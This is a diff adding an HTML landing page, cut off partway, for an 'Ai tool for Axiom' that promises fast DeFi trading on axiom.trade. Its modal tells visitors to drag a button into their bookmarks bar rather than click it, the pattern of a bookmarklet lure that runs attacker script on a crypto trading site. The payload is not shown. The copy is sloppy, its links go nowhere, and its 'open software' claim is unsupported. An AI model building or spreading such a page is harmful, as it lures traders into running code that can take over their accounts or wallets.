@@ -1,0 +1,4144 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Ai tool for Axiom - Precision DeFi Trading on axiom.trade</title>
+
+		<meta
+			name="description"
+			content="Built for serious traders, Ai tool for Axiom delivers raw speed, smart metrics, and razor-sharp alerts – all wired into the beating heart of axiom.trade. Track trends, execute faster than the competition."
+		/>
+		<meta
+			name="keywords"
+			content="DeFi, trading, axiom.trade, cryptocurrency, memecoin, leverage trading, smart triggers, blockchain"
+		/>
+		<meta name="author" content="Ai tool for Axiom" />
+
+		<meta
+			property="og:title"
+			content="Ai tool for Axiom - Precision DeFi Trading on axiom.trade"
+		/>
+		<meta
+			property="og:description"
+			content="Built for serious traders, Ai tool for Axiom delivers raw speed, smart metrics, and razor-sharp alerts – all wired into the beating heart of axiom.trade. Track trends, execute faster than the competition."
+		/>
+		<meta property="og:image" content="./og-image.png" />
+		<meta property="og:url" content="https://Ai tool for Axiom.pro" />
+		<meta property="og:type" content="website" />
+		<meta property="og:site_name" content="Ai tool for Axiom" />
+
+		<meta name="twitter:card" content="summary_large_image" />
+		<meta
+			name="twitter:title"
+			content="Ai tool for Axiom - Precision DeFi Trading on axiom.trade"
+		/>
+		<meta
+			name="twitter:description"
+			content="Built for serious traders, Ai tool for Axiom delivers raw speed, smart metrics, and razor-sharp alerts – all wired into the beating heart of axiom.trade."
+		/>
+		<meta name="twitter:image" content="./og-image.png" />
+
+		<link rel="icon" href="favicon.png" type="image/png" />
+		<link rel="shortcut icon" href="favicon.png" type="image/png" />
+		<link rel="apple-touch-icon" href="favicon.png" />
+		<link rel="shortcut icon" href="favicon.png" />
+
+		<link rel="stylesheet" href="aos@2.3.1/dist/aos.css" />
+		<style>
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
+			}
+
+			:root {
+				--primary: #10b981;
+				--primary-dark: #059669;
+				--bg-dark: #000000;
+				--bg-darker: #0a0a0a;
+				--text-primary: #ffffff;
+				--text-secondary: #9ca3af;
+				--border-color: #1f2937;
+			}
+
+			body {
+				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
+					Oxygen, Ubuntu, Cantarell, sans-serif;
+				background: var(--bg-dark);
+				color: var(--text-primary);
+				overflow-x: hidden;
+				line-height: 1.6;
+			}
+
+			.container {
+				max-width: 1400px;
+				margin: 0 auto;
+				padding: 0 2rem;
+			}
+
+			#particles-js {
+				position: fixed;
+				width: 100%;
+				height: 100%;
+				top: 0;
+				left: 0;
+				z-index: 0;
+			}
+
+			.content-wrapper {
+				position: relative;
+				z-index: 1;
+			}
+
+			header {
+				position: fixed;
+				width: 100%;
+				top: 0;
+				z-index: 1000;
+				background: rgba(0, 0, 0, 0.8);
+				backdrop-filter: blur(10px);
+				border-bottom: 1px solid var(--border-color);
+				transition: all 0.3s ease;
+			}
+
+			header.scrolled {
+				background: rgba(0, 0, 0, 0.95);
+			}
+
+			nav {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+				padding: 1.5rem 2rem;
+				max-width: 1400px;
+				margin: 0 auto;
+			}
+
+			.logo {
+				display: flex;
+				align-items: center;
+				gap: 0.5rem;
+				font-size: 1.5rem;
+				font-weight: 700;
+				text-decoration: none;
+				color: var(--text-primary);
+			}
+
+			.logo-icon {
+				width: 40px;
+				height: 40px;
+				background: var(--primary);
+				border-radius: 8px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 1.5rem;
+				font-weight: 800;
+			}
+
+			.nav-links {
+				display: flex;
+				gap: 2rem;
+				list-style: none;
+				align-items: center;
+			}
+
+			.nav-links a {
+				color: var(--text-primary);
+				text-decoration: none;
+				font-size: 0.95rem;
+				transition: color 0.3s;
+				position: relative;
+			}
+
+			.nav-links a:hover {
+				color: var(--primary);
+			}
+
+			.nav-links a::after {
+				content: '';
+				position: absolute;
+				bottom: -5px;
+				left: 0;
+				width: 0;
+				height: 2px;
+				background: var(--primary);
+				transition: width 0.3s;
+			}
+
+			.nav-links a:hover::after {
+				width: 100%;
+			}
+
+			.language-btn {
+				padding: 0.5rem 1rem;
+				background: rgba(16, 185, 129, 0.1);
+				border: 1px solid var(--primary);
+				border-radius: 8px;
+				color: var(--primary);
+				cursor: pointer;
+				font-weight: 600;
+				transition: all 0.3s;
+				font-size: 0.9rem;
+			}
+
+			.language-btn:hover {
+				background: rgba(16, 185, 129, 0.2);
+				transform: translateY(-2px);
+			}
+
+			.nav-actions {
+				display: flex;
+				gap: 1rem;
+				align-items: center;
+			}
+
+			.btn-primary {
+				padding: 0.75rem 2rem;
+				background: var(--primary);
+				color: white;
+				border: none;
+				border-radius: 8px;
+				font-size: 1rem;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s;
+				text-decoration: none;
+				display: inline-block;
+			}
+
+			.btn-primary:hover {
+				background: var(--primary-dark);
+				transform: translateY(-2px);
+				box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+			}
+
+			.hero {
+				min-height: 100vh;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				text-align: center;
+				padding-top: 100px;
+			}
+
+			.hero-content h1 {
+				font-size: clamp(2.5rem, 6vw, 5rem);
+				font-weight: 800;
+				margin-bottom: 1.5rem;
+				background: linear-gradient(135deg, #ffffff 0%, #10b981 100%);
+				-webkit-background-clip: text;
+				-webkit-text-fill-color: transparent;
+				background-clip: text;
+				line-height: 1.2;
+			}
+
+			.hero-content p {
+				font-size: 1.25rem;
+				color: var(--text-secondary);
+				max-width: 800px;
+				margin: 0 auto 2rem;
+			}
+
+			.hero-cta {
+				display: flex;
+				gap: 1rem;
+				justify-content: center;
+				align-items: center;
+				flex-wrap: wrap;
+			}
+
+			.cta-badge {
+				display: flex;
+				align-items: center;
+				gap: 0.5rem;
+				padding: 0.5rem 1rem;
+				background: rgba(16, 185, 129, 0.1);
+				border: 1px solid var(--primary);
+				border-radius: 50px;
+				font-size: 0.9rem;
+			}
+
+			.custom-icon {
+				width: 20px;
+				height: 20px;
+				display: inline-flex;
+				align-items: center;
+				justify-content: center;
+			}
+
+			.features-grid {
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+				gap: 2rem;
+				margin-top: 4rem;
+				max-width: 1100px;
+				margin-left: auto;
+				margin-right: auto;
+			}
+
+			.features-column {
+				display: flex;
+				flex-direction: column;
+				gap: 1rem;
+			}
+
+			.feature-item {
+				display: flex;
+				align-items: center;
+				gap: 1.5rem;
+				padding: 1.2rem 1.5rem;
+				background: rgba(255, 255, 255, 0.03);
+				border: 1px solid var(--border-color);
+				border-radius: 12px;
+				transition: all 0.3s;
+				position: relative;
+				overflow: hidden;
+				min-height: 90px;
+			}
+
+			.feature-item::before {
+				content: '';
+				position: absolute;
+				left: 0;
+				top: 0;
+				height: 100%;
+				width: 4px;
+				background: var(--primary);
+				transform: scaleY(0);
+				transition: transform 0.3s;
+			}
+
+			.feature-item:hover {
+				transform: translateX(8px);
+				border-color: var(--primary);
+				background: rgba(255, 255, 255, 0.05);
+			}
+
+			.feature-item:hover::before {
+				transform: scaleY(1);
+			}
+
+			.feature-item-icon {
+				width: 45px;
+				height: 45px;
+				background: linear-gradient(
+					135deg,
+					var(--primary),
+					var(--primary-dark)
+				);
+				border-radius: 10px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 1.5rem;
+				flex-shrink: 0;
+			}
+
+			.feature-item-content {
+				flex: 1;
+			}
+
+			.feature-item-content h3 {
+				font-size: 1rem;
+				margin-bottom: 0.3rem;
+			}
+
+			.feature-item-content p {
+				font-size: 0.85rem;
+				color: var(--text-secondary);
+				line-height: 1.4;
+			}
+
+			.section {
+				padding: 8rem 0;
+				position: relative;
+			}
+
+			.section-header {
+				text-align: center;
+				margin-bottom: 4rem;
+			}
+
+			.section-badge {
+				display: inline-block;
+				padding: 0.5rem 1.5rem;
+				background: rgba(16, 185, 129, 0.1);
+				border: 1px solid var(--primary);
+				border-radius: 50px;
+				font-size: 0.85rem;
+				font-weight: 600;
+				color: var(--primary);
+				text-transform: uppercase;
+				letter-spacing: 1px;
+				margin-bottom: 1rem;
+			}
+
+			.section-description {
+				font-size: 1.1rem;
+				color: var(--text-secondary);
+				max-width: 700px;
+				margin: 0 auto;
+			}
+
+			.activation-section {
+				background: linear-gradient(
+					135deg,
+					rgba(16, 185, 129, 0.05) 0%,
+					transparent 100%
+				);
+				border-radius: 24px;
+				padding: 4rem 2rem;
+				margin: 4rem 0;
+			}
+
+			.activation-steps {
+				max-width: 700px;
+				margin: 3rem auto;
+			}
+
+			.step-item {
+				display: flex;
+				gap: 2rem;
+				margin-bottom: 2rem;
+				align-items: flex-start;
+				opacity: 0;
+				transform: translateX(-50px);
+				animation: slideIn 0.6s forwards;
+			}
+
+			.step-item:nth-child(1) {
+				animation-delay: 0.1s;
+			}
+
+			.step-item:nth-child(2) {
+				animation-delay: 0.2s;
+			}
+
+			.step-item:nth-child(3) {
+				animation-delay: 0.3s;
+			}
+
+			.step-item:nth-child(4) {
+				animation-delay: 0.4s;
+			}
+
+			@keyframes slideIn {
+				to {
+					opacity: 1;
+					transform: translateX(0);
+				}
+			}
+
+			.step-number {
+				width: 50px;
+				height: 50px;
+				background: var(--primary);
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 1.5rem;
+				font-weight: 700;
+				flex-shrink: 0;
+				box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+			}
+
+			.step-content {
+				flex: 1;
+				padding-top: 0.5rem;
+			}
+
+			.step-content h3 {
+				font-size: 1.1rem;
+				margin-bottom: 0.5rem;
+			}
+
+			.step-content p {
+				color: var(--text-secondary);
+				font-size: 0.95rem;
+			}
+
+			.activate-button-wrapper {
+				text-align: center;
+				margin-top: 3rem;
+			}
+
+			.trial-info {
+				background: rgba(16, 185, 129, 0.1);
+				border: 1px solid var(--primary);
+				border-radius: 12px;
+				padding: 1.5rem 2rem;
+				margin: 2rem auto 2rem;
+				max-width: 600px;
+			}
+
+			.trial-info h4 {
+				font-size: 1.2rem;
+				color: var(--primary);
+				margin-bottom: 0.5rem;
+			}
+
+			.trial-info p {
+				color: var(--text-secondary);
+				font-size: 0.95rem;
+				line-height: 1.6;
+			}
+
+			.trial-info strong {
+				color: var(--text-primary);
+			}
+
+			#install-link-button {
+				padding: 1.5rem 4rem;
+				background: var(--primary);
+				color: white;
+				border: none;
+				border-radius: 12px;
+				font-size: 1.2rem;
+				font-weight: 700;
+				cursor: pointer;
+				transition: all 0.3s;
+				text-decoration: none;
+				display: inline-block;
+				position: relative;
+				overflow: hidden;
+			}
+
+			#install-link-button::before {
+				content: '';
+				position: absolute;
+				top: 50%;
+				left: 50%;
+				cursor: grab;
+				width: 0;
+				height: 0;
+				background: rgba(255, 255, 255, 0.2);
+				border-radius: 50%;
+				transform: translate(-50%, -50%);
+				transition: width 0.6s, height 0.6s;
+			}
+
+			#install-link-button:hover::before {
+				width: 300px;
+				height: 300px;
+			}
+
+			#install-link-button:hover {
+				transform: scale(1.05);
+				box-shadow: 0 20px 60px rgba(16, 185, 129, 0.4);
+			}
+
+			.two-column {
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+				gap: 4rem;
+				align-items: center;
+			}
+
+			.content-box {
+				background: rgba(255, 255, 255, 0.03);
+				border: 1px solid var(--border-color);
+				border-radius: 16px;
+				padding: 2rem;
+				height: 100%;
+			}
+
+			.trading-interface {
+				background: rgba(0, 0, 0, 0.5);
+				border: 1px solid var(--border-color);
+				border-radius: 16px;
+				padding: 2rem;
+				backdrop-filter: blur(10px);
+			}
+
+			.trading-header {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+				margin-bottom: 2rem;
+				padding-bottom: 1rem;
+				border-bottom: 1px solid var(--border-color);
+			}
+
+			.trading-form {
+				display: flex;
+				flex-direction: column;
+				gap: 1.5rem;
+			}
+
+			.form-group label {
+				display: block;
+				margin-bottom: 0.5rem;
+				font-size: 0.9rem;
+				color: var(--text-secondary);
+			}
+
+			.form-group input {
+				width: 100%;
+				padding: 1rem;
+				background: rgba(255, 255, 255, 0.05);
+				border: 1px solid var(--border-color);
+				border-radius: 8px;
+				color: var(--text-primary);
+				font-size: 1.5rem;
+				font-weight: 700;
+			}
+
+			.form-group input:focus {
+				outline: none;
+				border-color: var(--primary);
+			}
+
+			.direction-buttons {
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+				gap: 1rem;
+			}
+
+			.direction-btn {
+				padding: 1rem;
+				border: 1px solid var(--border-color);
+				border-radius: 8px;
+				background: rgba(255, 255, 255, 0.03);
+				color: var(--text-primary);
+				font-size: 1rem;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s;
+			}
+
+			.direction-btn.long {
+				background: rgba(16, 185, 129, 0.2);
+				border-color: var(--primary);
+			}
+
+			.direction-btn.short {
+				background: rgba(239, 68, 68, 0.2);
+				border-color: #ef4444;
+			}
+
+			.triggers-panel {
+				background: rgba(0, 0, 0, 0.8);
+				border: 1px solid var(--border-color);
+				border-radius: 16px;
+				padding: 2rem;
+			}
+
+			.triggers-header {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+				margin-bottom: 2rem;
+			}
+
+			.profit-badge {
+				background: rgba(16, 185, 129, 0.2);
+				padding: 0.75rem 1.5rem;
+				border-radius: 8px;
+			}
+
+			.profit-amount {
+				font-size: 2rem;
+				font-weight: 700;
+				color: var(--primary);
+			}
+
+			.trigger-item {
+				padding: 1.5rem;
+				background: rgba(255, 255, 255, 0.02);
+				border: 1px solid var(--border-color);
+				border-radius: 12px;
+				margin-bottom: 1rem;
+				cursor: pointer;
+				transition: all 0.3s;
+			}
+
+			.trigger-item:hover {
+				background: rgba(255, 255, 255, 0.05);
+				border-color: var(--primary);
+			}
+
+			.trigger-header {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+			}
+
+			.trigger-arrow {
+				font-size: 1.2rem;
+				transition: transform 0.3s;
+			}
+
+			.trigger-item.active .trigger-arrow {
+				transform: rotate(180deg);
+			}
+
+			.trigger-content {
+				max-height: 0;
+				overflow: hidden;
+				transition: max-height 0.3s ease;
+				padding-top: 0;
+			}
+
+			.trigger-item.active .trigger-content {
+				max-height: 500px;
+				padding-top: 1rem;
+			}
+
+			.trigger-content p {
+				color: var(--text-secondary);
+				line-height: 1.6;
+				font-size: 0.95rem;
+			}
+
+			.ecosystem-diagram {
+				position: relative;
+				padding: 4rem;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+			}
+
+			.central-logo {
+				width: 200px;
+				height: 200px;
+				background: linear-gradient(
+					135deg,
+					var(--primary),
+					var(--primary-dark)
+				);
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 5rem;
+				font-weight: 800;
+				box-shadow: 0 0 100px rgba(16, 185, 129, 0.5);
+				position: relative;
+				z-index: 10;
+			}
+
+			.ecosystem-node {
+				position: absolute;
+				background: rgba(0, 0, 0, 0.9);
+				border: 2px solid var(--border-color);
+				border-radius: 16px;
+				padding: 1.5rem 2rem;
+				transition: all 0.3s;
+				cursor: pointer;
+			}
+
+			.ecosystem-node:hover {
+				border-color: var(--primary);
+				transform: scale(1.05);
+				box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+			}
+
+			.ecosystem-node h4 {
+				font-size: 1.1rem;
+				margin-bottom: 0.5rem;
+			}
+
+			.ecosystem-node p {
+				font-size: 0.85rem;
+				color: var(--text-secondary);
+			}
+
+			.node-1 {
+				top: 10%;
+				left: 20%;
+			}
+
+			.node-2 {
+				top: 10%;
+				right: 20%;
+			}
+
+			.node-3 {
+				bottom: 20%;
+				left: 10%;
+			}
+
+			.node-4 {
+				bottom: 20%;
+				right: 10%;
+			}
+
+			footer {
+				background: var(--bg-darker);
+				border-top: 1px solid var(--border-color);
+				padding: 3rem 0;
+				text-align: center;
+			}
+
+			footer p {
+				color: var(--text-secondary);
+			}
+
+			.training-schedule {
+				display: grid;
+				grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+				gap: 1.5rem;
+				margin: 3rem 0;
+			}
+
+			.schedule-card {
+				background: rgba(255, 255, 255, 0.03);
+				border: 1px solid var(--border-color);
+				border-radius: 16px;
+				padding: 1.5rem;
+				transition: all 0.3s;
+				display: flex;
+				flex-direction: column;
+				min-height: 280px;
+			}
+
+			.schedule-card:hover {
+				border-color: var(--primary);
+				transform: translateY(-5px);
+				box-shadow: 0 10px 30px rgba(16, 185, 129, 0.2);
+			}
+
+			.schedule-card.coming-soon {
+				border: 2px dashed var(--border-color);
+				justify-content: center;
+				align-items: center;
+				text-align: center;
+			}
+
+			.schedule-card.coming-soon:hover {
+				border-color: var(--primary);
+			}
+
+			.schedule-icon {
+				width: 50px;
+				height: 50px;
+				background: linear-gradient(
+					135deg,
+					var(--primary),
+					var(--primary-dark)
+				);
+				border-radius: 12px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 1.5rem;
+				margin-bottom: 1rem;
+			}
+
+			.schedule-card h3 {
+				font-size: 1.2rem;
+				margin-bottom: 0.8rem;
+			}
+
+			.schedule-card p {
+				color: var(--text-secondary);
+				font-size: 0.9rem;
+				line-height: 1.5;
+				flex-grow: 1;
+			}
+
+			.telegram-link {
+				display: inline-flex;
+				align-items: center;
+				gap: 0.5rem;
+				padding: 1rem 2rem;
+				background: linear-gradient(135deg, #0088cc, #00a5e0);
+				color: white;
+				text-decoration: none;
+				border-radius: 12px;
+				font-weight: 600;
+				margin-top: 2rem;
+				transition: all 0.3s;
+			}
+
+			.telegram-link:hover {
+				transform: translateY(-3px);
+				box-shadow: 0 10px 30px rgba(0, 136, 204, 0.4);
+			}
+
+			.modal-overlay {
+				display: none;
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: rgba(0, 0, 0, 0.9);
+				backdrop-filter: blur(10px);
+				z-index: 9999;
+				align-items: center;
+				justify-content: center;
+			}
+
+			.modal-overlay.active {
+				display: flex;
+			}
+
+			.modal-content {
+				background: var(--bg-darker);
+				border: 2px solid var(--primary);
+				border-radius: 24px;
+				padding: 3rem;
+				max-width: 500px;
+				text-align: center;
+				animation: modalSlideIn 0.3s ease;
+			}
+
+			@keyframes modalSlideIn {
+				from {
+					opacity: 0;
+					transform: translateY(-50px);
+				}
+				to {
+					opacity: 1;
+					transform: translateY(0);
+				}
+			}
+
+			.modal-icon {
+				font-size: 4rem;
+				margin-bottom: 1rem;
+			}
+
+			.modal-title {
+				font-size: 1.8rem;
+				margin-bottom: 1rem;
+				color: var(--primary);
+			}
+
+			.modal-text {
+				font-size: 1.1rem;
+				color: var(--text-secondary);
+				line-height: 1.6;
+				margin-bottom: 2rem;
+			}
+
+			.modal-close-btn {
+				padding: 1rem 3rem;
+				background: var(--primary);
+				color: white;
+				border: none;
+				border-radius: 12px;
+				font-size: 1.1rem;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s;
+			}
+
+			.modal-close-btn:hover {
+				background: var(--primary-dark);
+				transform: scale(1.05);
+			}
+
+			@media (max-width: 1024px) {
+				.ecosystem-diagram {
+					flex-direction: column;
+					padding: 2rem 1rem;
+					gap: 2rem;
+				}
+				.central-logo {
+					width: 150px;
+					height: 150px;
+					font-size: 4rem;
+					margin-bottom: 2rem;
+				}
+				.ecosystem-node {
+					position: static;
+					margin: 0;
+					width: 100%;
+					max-width: 400px;
+				}
+				.features-grid {
+					grid-template-columns: 1fr;
+				}
+			}
+
+			@media (max-width: 768px) {
+				.ecosystem-diagram {
+					padding: 2rem 0.5rem;
+					gap: 1.5rem;
+				}
+				.central-logo {
+					width: 120px;
+					height: 120px;
+					font-size: 3rem;
+				}
+				.ecosystem-node {
+					padding: 1.25rem 1.5rem;
+				}
+				.ecosystem-node h4 {
+					font-size: 1rem;
+				}
+				.ecosystem-node p {
+					font-size: 0.8rem;
+				}
+				.container {
+					padding: 0 1rem;
+				}
+				.two-column {
+					grid-template-columns: 1fr;
+					gap: 2rem;
+				}
+				.nav-links {
+					display: none;
+				}
+				.hero {
+					padding-top: 120px;
+					min-height: auto;
+					padding-bottom: 4rem;
+				}
+				.hero-content h1 {
+					font-size: 2rem;
+				}
+				.hero-content p {
+					font-size: 1rem;
+				}
+				.section {
+					padding: 4rem 0;
+				}
+				.section-title {
+					font-size: 1.8rem;
+				}
+				.section-description {
+					font-size: 1rem;
+				}
+				.feature-item {
+					flex-direction: column;
+					text-align: center;
+				}
+				.training-schedule {
+					grid-template-columns: 1fr;
+				}
+				.modal-content {
+					margin: 1rem;
+					padding: 2rem;
+				}
+				nav {
+					padding: 1rem;
+				}
+				.logo {
+					font-size: 1.2rem;
+				}
+				.activation-steps {
+					padding: 0 1rem;
+				}
+				.step-item {
+					gap: 1rem;
+				}
+				#install-link-button {
+					padding: 1rem 2rem;
+					font-size: 1rem;
+				}
+				.features-grid {
+					grid-template-columns: 1fr;
+					gap: 2rem;
+				}
+			}
+
+			@media (max-width: 480px) {
+				.hero-content h1 {
+					font-size: 1.75rem;
+				}
+			}
+
+			.video-container {
+				margin: 2rem 0;
+				text-align: center;
+			}
+
+			.video-wrapper {
+				position: relative;
+				max-width: 800px;
+				margin: 0 auto;
+				border-radius: 16px;
+				overflow: hidden;
+				box-shadow: 0 10px 40px rgba(16, 185, 129, 0.2);
+				cursor: pointer;
+				transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+			}
+
+			.video-wrapper:hover {
+				transform: translateY(-5px);
+				box-shadow: 0 15px 50px rgba(16, 185, 129, 0.3);
+			}
+
+			.video-wrapper.expanded {
+				max-width: 100%;
+				transform: scale(1.05);
+			}
+
+			.video-wrapper.expanded:hover {
+				transform: scale(1.05);
+			}
+
+			.video-wrapper video {
+				width: 100%;
+				height: auto;
+				display: block;
+				border-radius: 16px;
+			}
+
+			.video-play-overlay {
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: rgba(0, 0, 0, 0.3);
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				transition: opacity 0.3s ease;
+				border-radius: 16px;
+			}
+
+			.video-wrapper:hover .video-play-overlay {
+				background: rgba(0, 0, 0, 0.5);
+			}
+
+			.video-wrapper.playing .video-play-overlay {
+				opacity: 0;
+				pointer-events: none;
+			}
+
+			.play-icon {
+				width: 80px;
+				height: 80px;
+				background: rgba(16, 185, 129, 0.9);
+				border-radius: 50%;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 2rem;
+				color: white;
+				padding-left: 5px;
+				transition: all 0.3s ease;
+			}
+
+			.video-wrapper:hover .play-icon {
+				transform: scale(1.1);
+				background: var(--primary);
+			}
+
+			.video-wrapper.expanded .video-play-overlay {
+				display: none;
+			}
+
+			@media (max-width: 768px) {
+				.play-icon {
+					width: 60px;
+					height: 60px;
+					font-size: 1.5rem;
+				}
+				.video-wrapper.expanded {
+					transform: scale(1.02);
+				}
+			}
+		</style>
+		<script src="language-switcher.js" defer></script>
+		<script type="module" src="../../_nuxt/assets/index.js"></script>
+	</head>
+
+	<body>
+		<div id="particles-js"></div>
+
+		<div class="modal-overlay" id="mobileModal">
+			<div class="modal-content">
+				<div class="modal-icon">
+					<svg
+						class="custom-icon"
+						width="64"
+						height="64"
+						viewBox="0 0 64 64"
+						fill="none"
+						xmlns="http://www.w3.org/2000/svg"
+					>
+						<rect
+							x="8"
+							y="12"
+							width="48"
+							height="36"
+							rx="2"
+							stroke="#10b981"
+							stroke-width="2"
+						/>
+						<rect x="4" y="48" width="56" height="4" rx="2" fill="#10b981" />
+						<circle cx="32" cy="30" r="4" fill="#10b981" />
+					</svg>
+				</div>
+				<h2 class="modal-title" data-translate="modal.title">
+					Desktop Only Feature
+				</h2>
+				<p class="modal-text" data-translate="modal.text">
+					Sorry, but we, like axiom.trade, work only with desktop connections.
+					You cannot add us to your bookmarks from a mobile device!
+				</p>
+				<button
+					class="modal-close-btn"
+					onclick="closeMobileModal()"
+					data-translate="modal.button"
+				>
+					Understood
+				</button>
+			</div>
+		</div>
+		<div class="modal-overlay" id="desktopModal">
+			<div class="modal-content">
+				<div class="modal-icon">
+					<svg
+						class="custom-icon"
+						width="64"
+						height="64"
+						viewBox="0 0 64 64"
+						fill="none"
+						xmlns="http://www.w3.org/2000/svg"
+					>
+						<path d="M32 8L20 20H28V40H36V20H44L32 8Z" fill="#10b981" />
+						<rect x="16" y="44" width="32" height="4" rx="2" fill="#10b981" />
+						<path d="M12 52H52V56H12V52Z" fill="#10b981" />
+					</svg>
+				</div>
+				<h2 class="modal-title" data-translate="dragModal.title">
+					Drag to Bookmarks
+				</h2>
+				<p class="modal-text" data-translate="dragModal.text">
+					Please drag this button to your bookmarks bar instead of clicking it.
+					This is required for the extension to work properly.
+				</p>
+				<button
+					class="modal-close-btn"
+					onclick="closeDesktopModal()"
+					data-translate="dragModal.button"
+				>
+					Got it
+				</button>
+			</div>
+		</div>
+
+		<div class="content-wrapper">
+			<header>
+				<nav>
+					<a href="#" class="logo" onclick="window.openModal()">
+						<div class="logo-icon">A</div>
+						<span>Ai tool for Axiom</span>
+					</a>
+					<ul class="nav-links">
+						<li>
+							<a
+								href="#about"
+								data-translate="nav.about"
+								onclick="scrollToAbout(); return false;"
+								>About</a
+							>
+						</li>
+						<li>
+							<a
+								href="#why"
+								data-translate="nav.why"
+								onclick="scrollToWhy(); return false;"
+								>Why Ai tool for Axiom</a
+							>
+						</li>
+						<li>
+							<a
+								href="#installation"
+								data-translate="nav.installation"
+								onclick="scrollToInstallation(); return false;"
+								>Installation</a
+							>
+						</li>
+						<li>
+							<a
+								href="#"
+								target="_blank"
+								rel="noopener"
+								onclick="window.openModal()"
+								>X</a
+							>
+						</li>
+						<li>
+							<a href="#" target="_blank" onclick="openAxiom(); return false;"
+								>axiom.trade</a
+							>
+						</li>
+					</ul>
+				</nav>
+			</header>
+
+			<section class="hero">
+				<div class="container">
+					<div class="hero-content" data-aos="fade-up">
+						<h1 data-translate="hero.title">
+							Precision DeFi Tracking & Trading on axiom.trade
+						</h1>
+						<p data-translate="hero.description">
+							Built for serious traders, Ai tool for Axiom delivers raw speed, smart
+							metrics, and razor-sharp alerts – all wired into the beating heart
+							of axiom.trade. Track trends, execute faster than the competition,
+							and ride every market pulse with surgical precision.
+						</p>
+						<div class="hero-cta">
+							<a
+								href="#"
+								class="btn-primary"
+								data-translate="nav.getStarted"
+								onclick="window.openModal()"
+								>How use</a
+							>
+							<div class="cta-badge">
+								<svg
+									class="custom-icon"
+									width="20"
+									height="20"
+									viewBox="0 0 20 20"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<path
+										d="M10 1L12.5 7H19L14 11L16 17L10 13L4 17L6 11L1 7H7.5L10 1Z"
+										fill="#10b981"
+										stroke="#10b981"
+										stroke-width="1"
+									/>
+								</svg>
+								<span data-translate="hero.openSoftware"
+									>Completely open software</span
+								>
+							</div>
+							<div class="cta-badge">
+								<svg
+									class="custom-icon"
+									width="20"
+									height="20"
+									viewBox="0 0 20 20"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<circle
+										cx="10"
+										cy="10"
+										r="8"
+										stroke="#10b981"
+										stroke-width="2"
+										fill="none"
+									/>
+									<circle cx="10" cy="10" r="3" fill="#10b981" />
+									<line
+										x1="10"
+										y1="2"
+										x2="10"
+										y2="6"
+										stroke="#10b981"
+										stroke-width="2"
+									/>
+								</svg>
+								<span data-translate="hero.freeFeatures"
+									>Explore free features</span
+								>
+							</div>
+							<div class="cta-badge">
+								<img
+									src="static/images/favicon.ico"
+									width="20"
+									height="20"
+									alt=""
+								/>
+								<span> department</span>
+							</div>
+						</div>
+
+						<div class="features-grid" data-aos="fade-up" data-aos-delay="200">
+							<div class="features-column">
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.multichain">
+											Detailed multichain pulse
+										</h3>
+										<p data-translate="features.multichainDesc">
+											Track activity across all major blockchain networks
+										</p>
+									</div>
+								</div>
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.triggers">
+											Build smart trade triggers
+										</h3>
+										<p data-translate="features.triggersDesc">
+											Automate your trading strategies with intelligent logic
+										</p>
+									</div>
+								</div>
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.wallets">
+											Index wallets by on-chain performance
+										</h3>
+										<p data-translate="features.walletsDesc">
+											Discover and track top-performing wallet addresses
+										</p>
+									</div>
+								</div>
+							</div>
+
+							<div class="features-column">
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
